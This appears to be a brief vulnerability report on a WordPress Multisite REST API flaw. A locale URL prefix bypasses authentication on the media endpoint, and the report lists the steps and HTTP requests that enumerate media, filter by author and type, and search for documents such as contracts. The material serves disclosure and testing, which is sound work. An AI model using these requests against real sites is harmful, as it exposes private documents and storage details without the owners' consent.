## Use case

The WordPress REST API media endpoint was accessible without authentication due to a locale-based routing bypass, allowing enumeration of sensitive media objects and metadata across multiple locales. This exposure revealed internal storage infrastructure and sensitive documents that should not have been publicly accessible.

## Steps to test

1. Identify the locale-specific URL prefixes for the target WordPress Multisite deployment.
2. Access the media endpoint using a locale prefix, e.g., GET /xx/wp-json/wp/v2/media.
3. Enumerate media objects by sending requests to GET /xx/wp-json/wp/v2/media/{media_id} for various media IDs.
4. Test filtering mechanisms by sending requests such as GET /xx/wp-json/wp/v2/media?author=71&per_page=1.
5. Analyze the metadata returned to identify storage infrastructure and sensitive documents.

## Commands

```text
GET /wp-json/wp/v2/media → 403 Forbidden
GET /xx/wp-json/wp/v2/media → 200 OK
GET /xx/wp-json/wp/v2/media/40000
GET /xx/wp-json/wp/v2/media?author=71&per_page=1
GET /xx/wp-json/wp/v2/media?search=contract&per_page=100
GET /xx/wp-json/wp/v2/media?search=contract&per_page=1
GET /xx/wp-json/wp/v2/media?media_type=application&per_page=100
```
